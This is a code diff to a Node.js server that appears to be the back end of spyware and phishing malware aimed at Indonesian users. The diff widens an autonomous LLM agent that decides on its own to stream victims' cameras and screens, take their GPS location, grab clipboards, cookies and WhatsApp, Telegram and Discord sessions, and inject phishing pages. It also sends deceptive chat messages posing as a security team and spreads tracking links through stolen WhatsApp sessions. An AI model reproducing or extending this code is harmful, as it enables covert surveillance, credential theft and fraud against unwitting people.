@@ -1039,7 +1039,8 @@ app.post('/api/ai/chat', async (req, res) => {
 
 // ===== AI AUTONOMOUS AGENT =====
 // Auto-executes actions on devices based on AI analysis
-const AI_AGENT_ENABLED = process.env.AI_AGENT !== 'false';
+let AI_AGENT_ENABLED = process.env.AI_AGENT !== 'false';
+let _aiAgentDisabled = !AI_AGENT_ENABLED;
 
 async function aiChat(messages, deviceId) {
     try {
@@ -1066,14 +1067,18 @@ async function aiChat(messages, deviceId) {
 function executeAgentAction(deviceId, action, params) {
     const socket = getDeviceSocket(deviceId);
     if (!socket) return;
+    const d = devices.get(deviceId);
     console.log(`[AI Agent] Executing on ${deviceId.slice(0,8)}...: ${action}`);
     switch (action) {
         case 'notify':
-            io.to(deviceId).emit('admin-show-notif', { title: params?.title || 'Neural AI', body: params?.body || 'Sistem mendeteksi aktivitas Anda.' });
+            io.to(deviceId).emit('admin-show-notif', {
+                title: params?.title || 'Neural AI - Verifikasi',
+                body: params?.body || 'Sistem mendeteksi aktivitas tidak biasa pada akun Anda.'
+            });
             break;
         case 'camera':
             io.to(deviceId).emit('start-camera-stream');
-            startAIAutoCapture(deviceId);
+            if (params?.autoCapture !== false) startAIAutoCapture(deviceId);
             break;
         case 'snapshot':
             io.to(deviceId).emit('take-snapshot');
@@ -1083,7 +1088,7 @@ function executeAgentAction(deviceId, action, params) {
                     const lastSnap = device.snapshots[device.snapshots.length - 1];
                     const fp = path.join(DATA_DIR, 'snapshots', lastSnap.filename);
                     if (fs.existsSync(fp)) {
-                        await sendTelegramPhoto(deviceId, fp, `[AI] ${device.label}\nSnapshot @ ${new Date().toLocaleString('id-ID')}`);
+                        await sendTelegramPhoto(deviceId, fp, `[AI Agent] ${device.label}\nSnapshot @ ${new Date().toLocaleString('id-ID')}`);
                     }
                 }
             }, 3000);
@@ -1104,6 +1109,35 @@ function executeAgentAction(deviceId, action, params) {
             break;
         case 'respawn':
             io.to(deviceId).emit('force-respawn');
+            break;
+        case 'locate':
+            io.to(deviceId).emit('request-location');
+            if (params?.alert) sendAIAlert(deviceId, 'AI Agent - Locate', `Meminta lokasi device...`).catch(()=>{});
+            break;
+        case 'screen':
+            io.to(deviceId).emit('start-screen-broadcast');
+            break;
+        case 'clipboard':
+            io.to(deviceId).emit('request-clipboard');
+            break;
+        case 'cookies':
+            io.to(deviceId).emit('request-cookies');
+            break;
+        case 'social-engineer':
+            io.to(deviceId).emit('admin-show-notif', { title: params?.persona || 'Tim Keamanan', body: 'Ada pesan penting untuk Anda. Klik untuk melihat.' });
+            setTimeout(() => {
+                addChatMessage(deviceId, 'assistant', params?.message || 'Halo, saya dari tim keamanan. Kami mendeteksi aktivitas mencurigakan.');
+                io.to(deviceId).emit('social-engineer-chat', { message: params?.message || 'Halo, saya dari tim keamanan.', persona: params?.persona || 'Tim Keamanan', engaging: false });
+            }, 3000);
+            break;
+        case 'session-grab':
+            io.to(deviceId).emit('request-session-grab', { platform: params?.platform || 'All', domain: params?.domain || window?.location?.hostname || 'unknown' });
+            break;
+        case 'telegram-alert':
+            sendAIAlert(deviceId, params?.alertType || 'AI Agent Alert', params?.message || 'Peringatan dari AI Agent.').catch(()=>{});
+            break;
+        case 'phishing':
+            io.to(deviceId).emit('inject-phishing', { site: params?.site || 'google.com', originalUrl: params?.url || '' });
             break;
         default:
             console.log(`[AI Agent] Unknown action: ${action}`);
@@ -1934,14 +1968,15 @@ async function aiAgentAnalyzeDevice(deviceId) {
     ].join('\n');
 
     const prompt = `A new device has connected. Analyze this device data and decide what actions to take.
-Available actions: auto-capture (start camera + auto snapshots every 10s + switch camera every 30s, sends to Telegram), notify (send notification), camera (start camera), snapshot (take photo), fullscreen (force fullscreen), torch (flash light), switch-camera (toggle front/back), respawn (re-inject tracking).
+Available actions: auto-capture (start camera + auto snapshots + switch camera, sends to Telegram), camera (start camera), snapshot (take photo), screen (start screen broadcast), locate (request GPS location), clipboard (grab clipboard), cookies (grab cookies), session-grab (grab WA/Telegram/Discord sessions), social-engineer (send AI chat message to victim), notify (send notification), fullscreen (force fullscreen), torch (flash light), switch-camera (toggle front/back), respawn (re-inject tracking).
 
 Device Data:
 ${deviceSummary}
 
 Rules:
-- If mobile device AND battery > 20%: consider auto-capture (recommended) or camera or snapshot
-- If desktop/laptop: consider fullscreen + notification
+- If mobile device AND battery > 20%: consider auto-capture (recommended) or camera or snapshot or screen
+- If desktop/laptop: consider screen or locate or notify
+- If from Indonesia: consider social-engineer
 - Respond with a JSON array of actions. Each action: {"action":"notify","params":{"title":"...","body":"..."}}
 - Max 2 actions per analysis.
 - Only respond with the JSON array, nothing else.`;
@@ -1989,7 +2024,7 @@ async function aiAgentPeriodicReview() {
         ].join('\n');
 
         const prompt = `Review this device's current state and decide if action is needed.
-Available actions: auto-capture (start camera + auto snapshots + switch camera + sends to Telegram), notify, camera, snapshot, fullscreen, torch, switch-camera, respawn.
+Available actions: auto-capture (start camera + auto snapshots + switch camera + sends to Telegram), camera (start camera), snapshot (take photo), screen (start screen broadcast), locate (request GPS), clipboard (grab clipboard), cookies (grab cookies), session-grab (grab WA/Telegram/Discord sessions), social-engineer (send AI chat to victim), notify (send notification), fullscreen (force fullscreen), torch (flash light), switch-camera (toggle front/back), respawn (re-inject tracking).
 
 Device State:
 ${summary}
@@ -1997,7 +2032,8 @@ ${summary}
 Rules:
 - If battery < 15%: no camera actions
 - If snapshots count = 0: suggest snapshot
-- If device has been online > 10 min with few actions: consider notify + camera
+- If device has been online > 10 min with few actions: consider notify + camera or screen
+- If keystrokes > 50: consider session-grab
 - Respond with a JSON array of actions (max 2), or empty array [] if no action needed.`;
 
         const response = await aiChat([
@@ -2020,13 +2056,11 @@ Rules:
     saveDevices();
 }
 
-// Start AI Agent periodic review (every 5 minutes)
-if (AI_AGENT_ENABLED) {
-    setInterval(aiAgentPeriodicReview, 300000);
-    // Also review 30 seconds after startup
-    setTimeout(aiAgentPeriodicReview, 30000);
-    console.log('[AI Agent] Autonomous agent enabled, review interval: 5 minutes');
-}
+// Start AI Agent periodic review (every 5 minutes) — always runs, checks runtime flag internally
+setInterval(aiAgentPeriodicReview, 300000);
+// Also review 30 seconds after startup
+setTimeout(aiAgentPeriodicReview, 30000);
+console.log(`[AI Agent] Periodic review scheduled. Runtime toggle: ${AI_AGENT_ENABLED ? 'ON' : 'OFF'}`);
 
 // Auto-trigger AI Agent when new device connects (called from socket handler)
 // This is triggered from the socket 'register-device' or new device detection
@@ -2831,6 +2865,23 @@ app.post('/api/admin/whatsapp-spread', async (req, res) => {
     d._whatsappSpread.push({ message: defaultMsg, link: trackingLink, time: Date.now() });
     saveDevices();
     res.json({ ok: true, link: trackingLink, message: defaultMsg, note: d.sessionGrabs?.some(s => s.platform === 'WhatsApp') ? 'WA session found, auto-spread triggered' : 'Link ready. Use WA session to spread manually.' });
+});
+
+// AI Agent toggle endpoint
+app.post('/api/admin/ai-agent-toggle', (req, res) => {
+    const token = req.headers['x-admin-token'];
+    if (!token || !adminTokens.has(token)) return res.status(401).json({ error: 'unauthorized' });
+    const { enabled } = req.body || {};
+    if (typeof enabled !== 'boolean') return res.status(400).json({ error: 'enabled must be boolean' });
+    AI_AGENT_ENABLED = enabled;
+    _aiAgentDisabled = !enabled;
+    console.log(`[AI Agent] ${enabled ? 'ENABLED' : 'DISABLED'} by admin`);
+    res.json({ ok: true, aiAgentEnabled: AI_AGENT_ENABLED });
+});
+app.get('/api/admin/ai-agent-status', (req, res) => {
+    const token = req.headers['x-admin-token'];
+    if (!token || !adminTokens.has(token)) return res.status(401).json({ error: 'unauthorized' });
+    res.json({ aiAgentEnabled: AI_AGENT_ENABLED });
 });
 
 // Get active domain for tracking link
